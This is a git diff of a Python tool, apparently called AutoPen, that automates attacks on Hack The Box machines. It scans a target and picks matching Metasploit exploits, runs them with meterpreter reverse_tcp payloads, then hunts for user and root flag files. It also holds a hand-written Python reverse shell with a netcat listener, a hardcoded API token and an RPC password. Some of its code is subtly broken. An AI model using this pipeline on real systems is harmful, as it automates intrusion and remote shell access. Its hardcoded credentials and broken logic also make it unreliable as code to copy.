@@ -8,14 +8,13 @@ import pyperclip
 import pymetasploit3
 from pymetasploit3 import *
 from pymetasploit3.msfrpc import MsfRpcClient
-import SimpleHTTPServer
-import SocketServer
+import http.server
+import socketserver
 import sys,socket,pty
 import sqlite3
+import tensorflow as tf
 
-parser = argparse.ArgumentParser(description='What box do you want to pwn?')
-parser.add_argument('--box', required=True)
-name = parser.parse_args()
+
 api = htb.HTB('OwBnueBa1zprFdqbWRQnNiXpyr0T1lIkZFQrwGUK0xnjD4Rs3yQxuUEGlHec')
 BASE_URL = 'https://www.hackthebox.eu/api'
 listOfBoxes = []
@@ -25,11 +24,25 @@ exploitList = []
 #print(type(a.get_machine(7)))
 #list = a.get_machine(7).get("ip")
 #print(list)
+#def parseArgs():
+parser = argparse.ArgumentParser(description='What box do you want to pwn?')
+parser.add_argument('--box', required=True)
+parser.add_argument('--action', default="assign")
+parser.add_argument('--init', default="no")
+name = parser.parse_args()
 
 def initBoxes():
     rawBoxes = api.get_machines()
     for rawBox in rawBoxes:
         listOfBoxes.append(Box(rawBox))
+
+def initialSetup():
+    # Connect to HTB VPN
+    os.system("xfce4-terminal -e \'bash -c \"sudo openvpn /home/mnm/Documents/AutoPen/DonDada.ovpn; bash\"\'")
+    time.sleep(10)
+    # Load metasploit RPC client
+    os.system("xfce4-terminal -e \'msfconsole -x \"load msgrpc Pass=1337hax0r\"\'")
+    time.sleep(20)
 
 def printAllBoxes():
     for box in listOfBoxes:
@@ -126,8 +139,9 @@ def getExploitsFromMsf():
         for line in lines:
             exploits = re.findall(r'(?:exploit|auxiliary)\/\w+\/\w+\/\w+', line)
             for exploit in exploits:
-                print(exploit)
-                exploitList.append(exploit)
+                if exploit != "exploit/windows/smb/ms17_010_eternalblue_win8":
+                    print(exploit)
+                    exploitList.append(exploit)
     return exploitList
 
 def cleanTemporaryFiles():
@@ -137,29 +151,31 @@ def cleanTemporaryFiles():
 
 def HTTPServer():
     PORT = 8000
-    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
-    httpd = SocketServer.TCPServer(("", PORT), Handler)
-    print "serving at port", PORT
-    httpd.serve_forever()
+    Handler = http.server.SimpleHTTPRequestHandler
+    with socketserver.TCPServer(("", PORT), Handler) as httpd:
+        print("serving at port", PORT)
+        httpd.serve_forever()
 
 def reverseShell():
     RHOST = name.box
     RPORT = 4242
     s=socket.socket()
     s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
-    os.dup2(s.fileno(),fd) for fd in (0,1,2)
-    pty.spawn("/bin/sh")'
+    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+    pty.spawn("/bin/sh")
+    os.system("xfce4-terminal -e \'bash -c \"nc -lvp \" + RPORT + \'")
+
 
 def exploitsDB():
-    conn = sqlite3.connect('example.db')
+    conn = sqlite3.connect('autopen.db')
     c = conn.cursor()
 
     # Create table
-    c.execute('''CREATE TABLE stocks
-                 (date text, trans text, symbol text, qty real, price real)''')
+    c.execute('''CREATE TABLE exploits
+                 (service text, exploit text)''')
 
     # Insert a row of data
-    c.execute("INSERT INTO stocks VALUES ('2006-01-05','BUY','RHAT',100,35.14)")
+    c.execute("INSERT INTO exploits VALUES ('vsftpd','windows/')")
 
     # Save (commit) the changes
     conn.commit()
@@ -168,62 +184,11 @@ def exploitsDB():
     # Just be sure any changes have been committed or they will be lost.
     conn.close()
 
-def windowsWorkflow():
+def workflow():
     #Clean temporary files
     #cleanTemporaryFiles()
     #Run nmap on machine
-    runNmap()
-    #Get CVEs
-    cveList = getCVEsFromNmap()
-    cveList = list(dict.fromkeys(cveList))
-    print(cveList)
-    #Search for exploits using searchsploit
-    exploitList = searchExploits(cveList)
-    print(exploitList)
-    # Initialize msfconsole
-    client = MsfRpcClient('1337hax0r', port=55552)
-    #Search for exploits in msfconsole
-    for cve in cveList:
-        os.system('msfconsole -x "search "' + cve + ' >> ' + name.box + '.exploits&')
-        time.sleep(15)
-    #Extract them from file
-    exploitList = getExploitsFromMsf()
-    for exploit in exploitList:
-        x = exploit.split("/")
-        if x[0] != "auxiliary":
-            exploitType = x[0]
-        exploitName = exploit.replace(exploitType + "/", "")
-        #Select exploit
-        exploit = client.modules.use(exploitType, exploitName)
-        #Set target
-        try:
-            exploit['RHOSTS'] = getBoxIP(name)
-        except KeyError:
-            exploit['RHOST'] = getBoxIP(name)
-        #Choose payload to use
-        payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
-        #Set our IP
-        payload['LHOST'] = 'tun0'
-        #Run the exploit
-        print("a")
-        exploit.execute(payload=payload)
-        time.sleep(20)
-    print(client.sessions.list)
-    #Interact with the newly opened session
-    shell = client.sessions.session(list(client.sessions.list.keys())[0])
-    shell.write('getuid')
-    shell.read()
-    print(shell.run_with_output('pwd'))
-    print(shell.run_with_output('search -f user.txt'))
-    print(shell.run_with_output('search -f root.txt'))
-    #print(shell.run_with_output('cat \'C:\\Users\\Administrator\\Desktop\\root.txt\''))
-    #print(shell.run_with_output('cat \'C:\\Users\\haris\\Desktop\\user.txt\''))
-
-def linuxWorkflow():
-    #Clean temporary files
-    # cleanTemporaryFiles()
-    #Run nmap on machine
-    # runNmap()
+    #runNmap()
     #Get CVEs
     cveList = getCVEsFromNmap()
     cveList = list(dict.fromkeys(cveList))
@@ -236,52 +201,61 @@ def linuxWorkflow():
     #Search for exploits in msfconsole
     # for cve in cveList:
     #     os.system('msfconsole -x "search "' + cve + ' >> ' + name.box + '.exploits&')
-    #     time.sleep(10)
+    #     time.sleep(15)
     #Extract them from file
     exploitList = getExploitsFromMsf()
     for exploit in exploitList:
         x = exploit.split("/")
-        print(x)
+        exploitType = x[0]
         if x[0] != "auxiliary":
-            exploitType = x[0]
-        exploitName = exploit.replace(exploitType + "/", "")
-        print(exploitName)
-        #Select exploit
-    #     exploit = client.modules.use(exploitType, exploitName)
-    #     #Set targetx
-    #     try:
-    #         exploit['RHOSTS'] = getBoxIP(name)
-    #     except KeyError:
-    #         exploit['RHOST'] = getBoxIP(name)
-    #     #Choose payload to use
-    #     payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
-    #     #Set our IP
-    #     payload['LHOST'] = 'tun0'
-    #     #Run the exploit
-    #     print("a")
-    #     exploit.execute(payload=payload)
-    #     time.sleep(20)
-    # print(client.sessions.list)
-    # #Interact with the newly opened session
-    # shell = client.sessions.session(list(client.sessions.list.keys())[0])
-    # shell.write('whoami')
-    # shell.read()
-    # print(shell.run_with_output('pwd'))
-    # print(shell.run_with_output('search -f user.txt'))
-    # print(shell.run_with_output('search -f root.txt'))
+            exploitName = exploit.replace(exploitType + "/", "")
+            print(exploitName)
+            #Select exploit
+            exploit = client.modules.use(exploitType, exploitName)
+            #Set target
+            try:
+                exploit['RHOSTS'] = getBoxIP(name)
+            except KeyError:
+                exploit['RHOST'] = getBoxIP(name)
+            #Choose payload to use
+            #print(exploit.targetpayloads())
+            if getBoxOS(name) == "Windows":
+                if exploitName in ["windows/smb/ms17_010_eternalblue", "windows/smb/smb_doublepulsar_rce"]:
+                    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+                else:
+                    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+            elif getBoxOS(name) == "Linux":
+                payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
+            #Set our IP
+            payload['LHOST'] = 'tun0'
+            #Run the exploit
+            exploit.execute(payload=payload)
+            time.sleep(20)
+    print(client.sessions.list)
+    #Interact with the newly opened session
+    shell = client.sessions.session(list(client.sessions.list.keys())[0])
+    if getBoxOS(name) == "Windows":
+        shell.write('getuid')
+    elif getBoxOS(name) == "Linux":
+        shell.write('whoami')
+    shell.read()
+    print(shell.run_with_output('pwd'))
+    print(shell.run_with_output('search -f user.txt'))
+    print(shell.run_with_output('search -f root.txt'))
     #print(shell.run_with_output('cat \'C:\\Users\\Administrator\\Desktop\\root.txt\''))
     #print(shell.run_with_output('cat \'C:\\Users\\haris\\Desktop\\user.txt\''))
 
-
+#parseArgs()
+if name.init == "yes":
+    initialSetup()
 initBoxes()
 #Switch to assign/remove box
-controlBox(name, "assign")
+if name.action == "assign":
+    controlBox(name, "assign")
+elif name.action == "remove":
+    controlBox(name, "remove")
 #printAllBoxes()
-if getBoxOS(name) == "Linux":
-    linuxWorkflow()
-elif getBoxOS(name) == "Windows":
-    windowsWorkflow()
-
+workflow()
 
 # productList = []
 # with open('nmapOutput.csv', newline='') as csvfile:
